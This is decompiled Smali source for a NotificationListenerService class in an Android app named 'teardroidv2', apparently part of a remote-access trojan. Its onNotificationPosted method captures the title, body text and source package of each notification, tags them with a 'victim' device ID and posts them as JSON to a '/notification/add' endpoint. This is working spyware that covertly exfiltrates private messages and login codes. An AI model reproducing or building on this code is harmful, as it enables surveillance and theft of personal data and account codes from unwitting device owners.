.class public final Lcom/example/teardroidv2/NotificationListenerService;
.super Landroid/service/notification/NotificationListenerService;
.source "NotificationListenerService.kt"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/example/teardroidv2/NotificationListenerService$NLServiceReceiver;
    }
.end annotation

.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000*\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0008\u0002\n\u0002\u0010\u000e\n\u0000\n\u0002\u0018\u0002\n\u0002\u0008\u0002\n\u0002\u0010\u0002\n\u0002\u0008\u0003\n\u0002\u0018\u0002\n\u0002\u0008\u0002\u0018\u00002\u00020\u0001:\u0001\u000eB\u0005\u00a2\u0006\u0002\u0010\u0002J\u0008\u0010\u0007\u001a\u00020\u0004H\u0002J\u0008\u0010\u0008\u001a\u00020\tH\u0016J\u0008\u0010\n\u001a\u00020\tH\u0016J\u0010\u0010\u000b\u001a\u00020\t2\u0006\u0010\u000c\u001a\u00020\rH\u0016R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082D\u00a2\u0006\u0002\n\u0000R\u0014\u0010\u0005\u001a\u0008\u0018\u00010\u0006R\u00020\u0000X\u0082\u000e\u00a2\u0006\u0002\n\u0000\u00a8\u0006\u000f"
    }
    d2 = {
        "Lcom/example/teardroidv2/NotificationListenerService;",
        "Landroid/service/notification/NotificationListenerService;",
        "()V",
        "TAG",
        "",
        "nlservicereciver",
        "Lcom/example/teardroidv2/NotificationListenerService$NLServiceReceiver;",
        "getVictimID",
        "onCreate",
        "",
        "onDestroy",
        "onNotificationPosted",
        "sbn",
        "Landroid/service/notification/StatusBarNotification;",
        "NLServiceReceiver",
        "app_release"
    }
    k = 0x1
    mv = {
        0x1,
        0x6,
        0x0
    }
    xi = 0x30
.end annotation


# instance fields
.field private final TAG:Ljava/lang/String;

.field private nlservicereciver:Lcom/example/teardroidv2/NotificationListenerService$NLServiceReceiver;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 15
    invoke-direct {p0}, Landroid/service/notification/NotificationListenerService;-><init>()V

    .line 16
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v0}, Lcom/example/teardroidv2/AppInfo;->getTAG()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/example/teardroidv2/NotificationListenerService;->TAG:Ljava/lang/String;

    return-void
.end method

.method private final getVictimID()Ljava/lang/String;
    .locals 3

    .line 52
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v0}, Lcom/example/teardroidv2/AppInfo;->getVictimDatastore()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/example/teardroidv2/NotificationListenerService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 53
    sget-object v1, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v1}, Lcom/example/teardroidv2/AppInfo;->getVictimID()Ljava/lang/String;

    move-result-object v1

    const-string v2, "invalid ID"

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNull(Ljava/lang/Object;)V

    return-object v0
.end method


# virtual methods
.method public onCreate()V
    .locals 2

    .line 19
    invoke-super {p0}, Landroid/service/notification/NotificationListenerService;->onCreate()V

    .line 20
    new-instance v0, Lcom/example/teardroidv2/NotificationListenerService$NLServiceReceiver;

    invoke-direct {v0, p0}, Lcom/example/teardroidv2/NotificationListenerService$NLServiceReceiver;-><init>(Lcom/example/teardroidv2/NotificationListenerService;)V

    iput-object v0, p0, Lcom/example/teardroidv2/NotificationListenerService;->nlservicereciver:Lcom/example/teardroidv2/NotificationListenerService$NLServiceReceiver;

    .line 21
    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    .line 22
    sget-object v1, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v1}, Lcom/example/teardroidv2/AppInfo;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 23
    iget-object v1, p0, Lcom/example/teardroidv2/NotificationListenerService;->nlservicereciver:Lcom/example/teardroidv2/NotificationListenerService$NLServiceReceiver;

    check-cast v1, Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v1, v0}, Lcom/example/teardroidv2/NotificationListenerService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    return-void
.end method

.method public onDestroy()V
    .locals 1

    .line 27
    invoke-super {p0}, Landroid/service/notification/NotificationListenerService;->onDestroy()V

    .line 28
    iget-object v0, p0, Lcom/example/teardroidv2/NotificationListenerService;->nlservicereciver:Lcom/example/teardroidv2/NotificationListenerService$NLServiceReceiver;

    check-cast v0, Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Lcom/example/teardroidv2/NotificationListenerService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    return-void
.end method

.method public onNotificationPosted(Landroid/service/notification/StatusBarNotification;)V
    .locals 6

    const-string v0, "sbn"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 32
    sget-object v0, LRequest;->Companion:LRequest$Companion;

    move-object v1, p0

    check-cast v1, Landroid/content/Context;

    invoke-virtual {v0, v1}, LRequest$Companion;->init(Landroid/content/Context;)V

    .line 33
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 34
    invoke-virtual {p1}, Landroid/service/notification/StatusBarNotification;->getNotification()Landroid/app/Notification;

    move-result-object v1

    iget-object v1, v1, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    const-string v2, "android.title"

    invoke-virtual {v1, v2}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    .line 35
    invoke-virtual {p1}, Landroid/service/notification/StatusBarNotification;->getNotification()Landroid/app/Notification;

    move-result-object v2

    iget-object v2, v2, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    const-string v3, "android.bigText"

    invoke-virtual {v2, v3}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    .line 36
    new-instance v3, Landroid/content/Intent;

    sget-object v4, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v4}, Lcom/example/teardroidv2/AppInfo;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 38
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "onNotificationPosted :"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Landroid/service/notification/StatusBarNotification;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lkotlin/text/StringsKt;->trimIndent(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "notification_event"

    .line 37
    invoke-virtual {v3, v5, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v4, "id"

    .line 40
    invoke-virtual {p1}, Landroid/service/notification/StatusBarNotification;->getId()I

    move-result v5

    invoke-virtual {v0, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string v4, "device_id"

    .line 41
    invoke-direct {p0}, Lcom/example/teardroidv2/NotificationListenerService;->getVictimID()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v4, "Package"

    .line 42
    invoke-virtual {p1}, Landroid/service/notification/StatusBarNotification;->getPackageName()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, v4, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p1, "titleText"

    .line 43
    invoke-virtual {v0, p1, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p1, "notificationBodyText"

    .line 44
    invoke-virtual {v0, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 45
    new-instance p1, LRequest;

    .line 47
    sget-object v1, Lcom/example/teardroidv2/NotificationListenerService$onNotificationPosted$1;->INSTANCE:Lcom/example/teardroidv2/NotificationListenerService$onNotificationPosted$1;

    check-cast v1, Lkotlin/jvm/functions/Function1;

    sget-object v2, Lcom/example/teardroidv2/NotificationListenerService$onNotificationPosted$2;->INSTANCE:Lcom/example/teardroidv2/NotificationListenerService$onNotificationPosted$2;

    check-cast v2, Lkotlin/jvm/functions/Function1;

    const-string v4, "/notification/add"

    .line 45
    invoke-direct {p1, v4, v1, v2}, LRequest;-><init>(Ljava/lang/String;Lkotlin/jvm/functions/Function1;Lkotlin/jvm/functions/Function1;)V

    .line 47
    invoke-virtual {p1, v0}, LRequest;->post(Lorg/json/JSONObject;)V

    .line 48
    invoke-virtual {p0, v3}, Lcom/example/teardroidv2/NotificationListenerService;->sendBroadcast(Landroid/content/Intent;)V

    return-void
.end method
